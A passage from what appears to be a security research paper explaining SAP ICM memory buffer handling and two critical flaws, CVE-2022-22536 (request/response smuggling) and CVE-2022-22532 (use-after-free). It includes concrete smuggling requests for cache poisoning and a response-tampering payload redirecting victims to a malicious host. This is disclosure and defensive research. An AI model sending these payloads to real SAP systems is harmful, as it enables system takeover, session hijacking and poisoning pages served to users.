---------------------------------------------------
GET /SomeServlet HTTP/1.1
Host: sapserver.com
Content-Length: 70000
---------------------------------------------------
As the request headers are contained in the first 65455 bytes (as expected) the Worker
Thread will only copy those bytes in the first MPI Out Buffer.
Next the headers will be parsed and the corresponding sub handlers will be called to try to
create a response.
In this case, the request will not be resolved by the ICM internal sub handlers and so finally
the HttpJ2EE2Handler will be called. At that moment, the extra bytes of the request (body
bytes) will be read and copied to a new MPI buffer. After this, the buffers are flushed to the
Java Server Process (this is, the pointer to the shared memory is sent to the Java Process).
With the entire request in memory, the Java Process will resolve the request and return an
HTTP response that must be sent back to the client.
Step 5: Communicate Response
Once the response is created by the Java/ABAP process, it needs to be sent back to the
ICM Worker Thread. And in order for this to happen, one or more MPI Buffers are created
containing the HTTP message. The reference to this MPI In Buffer (shared memory) is sent
to the Worker Thread, which will use it to retrieve the response.
It is important to notice that the MPI In Buffers are obtained from the same Queue as the
MPI Out Buffers. For this reason one shared memory region can be used as a request buffer
by one thread/process, and later be used as a response buffer for the same (or different)
connection.
Just like the request headers are parsed when the client’s message is received, the same
goes for the response headers. This time, the function in charge of obtaining the different
header names-values is HttpParseResponseHeader.
There are a number of different headers recognized by the mentioned function, but in
particular, the ICM will recognize the sap-cache-control name, as this special header is used
after to determine if the cache response handler should be called.
Step 6: Dispatch Response
Once the response headers are parsed, the ICM needs to send the response back to the
client. To do so, it will first retrieve all the response MPI Buffers from the shared memory.
These buffer pointers are returned from the Java/ABAP process and will be used to send the
HTTP message through the open TCP connection.
Step 7: Clean MPI Buffers
Finally, all MPI buffers are freed to allow other Connections to be able to use them again.
Freeing an MPI buffer will mark the buffer as not used, increase the Free MPI counter and
return the buffer IDs to the MPI Queue.
Even though request and response buffers are freed through the different steps (after
requests and responses are completed), there is a FreeAllMPIBuffers() function which will
ensure that no MPI buffers are left reserved once the response is delivered back.
Once the MPI Buffers are freed and the response is sent back to the client, the Worker
Thread will go back to sleep until a new request is received.
MPI Desynchronization
CVE-2022-22536
SAP ICM uses MPI buffers in shared memory to transfer HTTP data between the internal
handlers and the working processes (or java server processes). These buffers have a fixed
size of 65536 bytes.
As HTTP request and response sizes could be larger than 2^16 - 81, a single message
could require multiple MPI Buffers to be transmitted.
The length of the HTTP headers in a request, including the URI line, cannot be larger than
2^16  (In the case of the ICM, this length is reduced due to the buffer headers and the null
byte).
For this reason, when a multi-MPI Buffer message arrives, the ICM will process the first
Buffer only, as HTTP headers can fit a single one. With it, different internal Handlers will
preprocess the request before the actual body in other MPI buffers is required (by the work
process) and flushed.
Right after the request is resolved, all used MPI buffers are discarded and the ICM will
continue processing the next queued ones (pipelining).
However, as special requests can be resolved by static handlers before they reach the
working process (java/abap), some MPI buffers containing HTTP data might not get used.
This means that all remaining data, which should have been consumed using the
message-length header of the request, will remain in the network queue.
For this reason, if a request larger than 2^16 bytes is sent to the ICM and gets resolved by a
static handler, the payload after the 65455 byte (buffer size - MPI header) will be considered
a new request. This will not be consistent with any proxy HTTP parser, and therefore will
cause a desynchronization in the connection.
Using this technique, an attacker could use Request and Response Smuggling to completely
take control of the target system.
What's more, as the attack does not rely on any special header, it can be sent through HTML
and JavaScript. This means that an attacker could place the payload in a malicious web
server and if a victim visits the site, the browser will perform the smuggling attack and the
system will get compromised.
ICM Response Smuggling
Response smuggling works by placing focus on the response queue of the HTTP
communication instead of the requests. This means that an attacker will try to desync a
response by splitting it into 2 different ones.
The HTTP/1.1 RFC states that HEAD responses can contain the original Content-Length
header (different from 0), however this value must be ignored by any proxy or client as it
corresponds to the special HEAD request. But still, this means that a response containing an
empty body and a Content-Length header with a value greater than 0 is issued and so it is
extremely important that all proxies forwarding this response know that it corresponds to the
HEAD request.
If a smuggled request, hidden from the proxy, includes a HEAD method message, the
response generated at the backend will only contain the headers of the response (as
expected), but the proxy will consider the Content-Length to be valid and will expect a
non-empty body. This will happen because the proxy, in this case the Web Dispatcher, will
relate the mentioned response with the next request arriving (the one that follows the
malicious payload containing the smuggled message).
In the example from the image, when the responses are sent back to the Web Dispatcher,
both will be related to GET requests, which means that the content-length must be used to
know the length of the body.
In this case, the ICM will generate 3 responses (GET, HEAD and GET), but the Proxy will
relate the first 2 with the first 2 GET messages. This means that the first response will be
forwarded as expected, but the second one will contain the Content-Length header (and an
empty body), which will force the Web Dispatcher to wait for more data (the amount of bytes
indicated in the value of the Content-Length) to use as the body.
To obtain arbitrary cache poisoning, an attacker can choose to use the headers of a
response containing the Cache-Control directive (max-age>0). This will force the Proxy to
store the new concatenated response in the Web Cache and poison the URL of the last
issued GET request.
If the body of the new concatenated HTTP message contains a malicious payload, such as
reflected data that can be used to execute JavaScript code, then every user trying to access
the selected (arbitrary) URL will receive the Cache stored payload.
The same idea can be improved by injecting multiple responses (Response Smuggling) with
the first malicious request (GET+HEAD+ANY) which can be used to build the new HTTP
payload. This can help the attacker to create more complex attacks such as the one in the
Java example which permanently replaces a login page with a single request.
The following request could be used to poison an arbitrary URL with a malicious JS payload:
GET /sap/admin/public/default.html?a HTTP/1.1
Host: www.SapServer.com
Content-Length: 
Padding: 
HEAD /webdynpro/welcome/Welcome.html HTTP/1.1
Host: 
HEAD http:///nwa HTTP/1.1
Host: www.SapServer.com
Content-Length: 1
GET /poisoned_URL HTTP/1.1
Host: aaaaa.com
Connection: close
Browser-Backend Desync
Most HTTP Desynchronization vulnerabilities rely on Header parsing errors. This means that
the request used to smuggle malicious payloads needs to contain a special header to
desynchronize the frontend and backend servers.
As CVE-2022-22536 causes desynchronization using an internal memory error, it is possible
to send the payload through basic HTML/JavaScript requests. The same would be valid if
the HTTP header required for exploitation is valid and can be sent through javascript to the
vulnerable domain.
For this reason, an attacker could create a malicious web page which will trigger the attack
as soon as a victim renders its content. This way, the victim’s browser could be seen as the
front-end even when a single connection is used per client. This condition can be found
when TCP pooling is disabled or when no proxy is present.
To successfully hijack a victim’s browser, it would be necessary to launch a phishing attack,
which will force the user to execute the following payload:
Using this technique it is possible to create a Desynchronization Botnet to compromise every
client’s connection and persist the attack with a single request. The same idea could be used
with Response Smuggling and JS Cache Poisoning.
MPI Use-After-Free
CVE-2022-22532
Each time a Worker Thread receives an HTTP request from the internet, it asks for an MPI
buffer to store the incoming data. It also stores information about the mentioned buffer, such
as state, content-length, individual buffer length, writing offset and others.
Once response parser and handler functions complete their execution, the message is sent
to the client and the Worker Thread cleans up all used memory resources with the method
MpiIFreeAllBuffers and goes back to sleep until another request is ready to be processed.
This means releasing the MPI buffers so that they can be used again in future requests and
by other Worker Threads.
The Internet Communication Manager implements pipelining which allows clients to send
multiple concatenated requests that should be resolved in order and isolated by the backend
server.
For this reason, more data is received after the end of the first HTTP request, and this is
considered to be another pipelined message. This extra data is placed on another MPI
buffer, which is obtained using the same IcmMpiGetOutbuf function. And right after the next
request is placed in the new buffer, the execution of the ICM parser and handlers continue
as if no extra data existed.
But when the first response is sent and the Worker Thread releases all MPI buffers using the
MpiIFreeAllBuffers() method, the pipelined buffer will also be marked as free. This allows
other Worker Threads to claim the buffer for themselves, while the pipelined request’s
connection still has the reference to it. This allows one Worker Thread connection to affect
the request/response of another one holding the same memory reference.
When the Worker Thread handles the second request, it will be parsed and when finally it is
flushed by the last HTTP handler, an MPI Error will Trigger. But if the pipelined request was
incomplete, the Worker Thread will ask for more data, and until received it will go back to
sleep. This happens when no headers termination sequence is found or when the content
length value is larger than the amount of bytes in the body.
At that time, another Worker Thread or Process (Java/ABAP) will use the same buffer to
handle a different connection (victim). This will allow the attacker to send more data which
will be written to this buffer, tampering an arbitrary amount of bytes in the same offset that
expected.
Buffer Hijacking
To trigger an HTTP tampering attack and modify other victim’s requests and connections, it
is necessary to send two pipelined messages to the ICM. The first one will be processed
normally as expected.
When the Worker Thread handles the second request, it will be parsed and when finally it is
flushed by the last HTTP handler, an MPI Error will Trigger.
But if the pipelined request was incomplete, the Worker Thread will ask for more data, and
until received it will go back to sleep. This happens when no headers termination sequence
is found or when the content length value is larger than the amount of bytes in the body.
At that time, another Worker Thread or Process (Java/ABAP) will use the same buffer to
handle a different connection (victim). This will allow the attacker to send more data which
will be written to this buffer, tampering an arbitrary amount of bytes in the same offset that
expected.
As an example, if the attacker sends the following request:
GET / HTTP/1.1
Host: sapserver.com
Content-Length: 0
01234
The string “01234” will be treated as a pipelined message.
When the Worker Thread WT starts parsing it, it will find that the request is not complete (no
break line sequence) and therefore it will wait (asleep) for more data to arrive.
Next, another Worker Thread WT_X will handle a different connection using the same buffer
to hold the arriving request:
GET /someValidURL?param1=a&param2=b HTTP/1.1
Host: sapServer.com
Cookies: sessionId=secretcookie123
During this, the attacker will send more data: “otherURL?param1=c#”, which will cause the
first WT to awaken. At this moment the WT will write the attacker’s payload in the same
buffer at position 5, right where it was the last byte in the original request “01234”. This will
overwrite the bytes in the WT_X request as they share the same buffer:
GET /otherURL?param1=c#\001=a&param2=b HTTP/1.1
Host: sapServer.com
Cookies: sessionId=secretcookie123
When the WT_X either parses the victim’s message or when it is flushed to the Java/ABAP
process, the tampered request will be used allowing the attacker to control the connection of
the victim.
As it can be noticed in the example, a null byte is placed after writing in the buffer. If the null
byte is present in the body, both the parser and the Java/ABAP process will successfully
process it. However, if the null byte is in the headers, only the other processes will exit
normally. The HTTP parser will throw an error as null bytes are not allowed. This is just
something to consider on exploitation and results analysis.
HTTP Message Tampering
This Use After Free vulnerability can be exploited using Request/Response Smuggling
techniques, only in this case a proxy is not required. What's more, the attacker can arbitrarily
overwrite the request of the victim instead of injecting a prefix.
As MPI Buffers are not different for requests and responses, the attack can also be used to
tamper any response data. This can be especially useful to hijack data using an HTTP 308
redirection response. And to persist the attack, it is possible to poison the internal Web
Cache of the ICM, by sending a payload that is intended to tamper a valid HTTP response.
Original response:
HTTP/1.1 200 OK
server: SAP NetWeaver Application Server 7.53 / AS Java 7.50
content-type: text/html; charset=utf-8
content-length: 10
HelloWorld
Attacker Payload (starting from 4th position as in the previous example):
1.1 308 Found
server: SAP NetWeaver Application Server 7.53 / AS Java 7.50
location: http://maliciousHost.com
X-other:
Final response to victim:
HTTP/1.1 308 Found
server: SAP NetWeaver Application Server 7.53 / AS Java 7.50
location: http://maliciousHost.com
X-other: length: 10
HelloWorld
The same idea can be used to save a malicious response in the cache by including the
Sap-Cache-Control header in the injected response. This can be used just as in HTTP
Response Smuggling with Arbitrary Web Cache Poisoning.
OOB Buffer Tampering
Finally, as MPI buffers also contain control data in out-of-band (OOB) pipes, tampering with
these buffers can cause critical impact on the ICM server. As these shared memory regions
hold memory pointers and connection state information, an attacker could modify this to
crash the ICM or even take control of the process and execute malicious native code.
The difference between tampering Requests/Responses and OOB Buffers is that there is
less time between data being written and read from the last ones. For this reason, it is more
probable that, when writing on a freed hijacked buffer, the memory region affected
corresponds to a Request or a Response.
To increase chances of hitting an OOB buffer, it is important to understand which process
operates with this information and how they do it.
OOB Buffers are used to synchronize the communication between the ICM and the
Java/ABAP process. To do so, each ICM thread handling a client (TCP) connection will
request two OOB buffers to the MPI Handler: One to send request’s information to the
Worker Process and one to read responses from it.
Just as any in producer-consumer application, the ICM thread will write the request in one
(or more) MPI Data Buffer and mark the out OOB as “ready”. When this happens, a Java
Thread will see that a new request is ready and will use the OOB information to know which
memory regions should be used, as well as metadata of the incoming HTTP message.
As Java Threads that are not busy are alway waiting for OOB data to process a request, the
time between writing and reading these buffers is extremely short. However, there is a way
to increase this time and successfully tamper the shared memory before it is used.
For this, an attacker must force an ICM Worker Thread to forward a request when all Java
Threads are busy. In this condition, the OOB buffer will be written by the ICM process, but it
will only be read when the Java Process has a free Thread ready to handle the request.
Because the amount of ICM Worker Threads in a default installation is higher than the Java
Threads used to handle HTTP requests, it is possible to have more active producers than
consumers. This can be achieved by sending more HTTP requests (in different TCP
connections) than the number of Java Threads.
When this happens, some ICM Threads will write OOB buffers that will stay idle until a Java
Thread completes its work and is ready to handle a new request.
Once in control of the OOB buffer, an attacker could modify the address pointers of the
related Request Buffers. By this, it is possible to leverage the same “incomplete request”
technique used to tamper Data Buffers. Only this time, the ICM will write the arriving bytes
on the address indicated by the OOB buffer, resulting in a Write-What-Where condition.
With sufficient information about the memory layout and using Ret2libc and ROP techniques
it would be possible to craft a RCE payload. Still, the complexity of the attack makes this
exploitation less probable in the wild.
Conclusion
The aforementioned vulnerabilities present a critical risk to all unprotected SAP applications
that are not patched with the corresponding SAP Security Notes. Without taking prompt
action to mitigate this risk, it’s possible that an unauthenticated attacker could fully
compromise any unpatched SAP system in a simple way.
These notes are rated with the highest CVSS scores and affect commonly deployed
components in multiple, widely deployed products from SAP. It is also important to highlight
that the affected components, by design, are intended to be exposed to the Internet, thereby
greatly increasing the risk that any attacker, with access to the HTTP(S) port of a Java or
ABAP system, could take over the applications and, in some circumstances, even the host
OS.
Furthermore, because in scenarios involving SAP NetWeaver Java systems, exploitation
does not necessarily require a proxy between the ICM and the client, SAP and US CISA
believe that all unpatched SAP applications are at risk and strongly advise all impacted
organizations to prioritize patching these affected systems as soon as possible.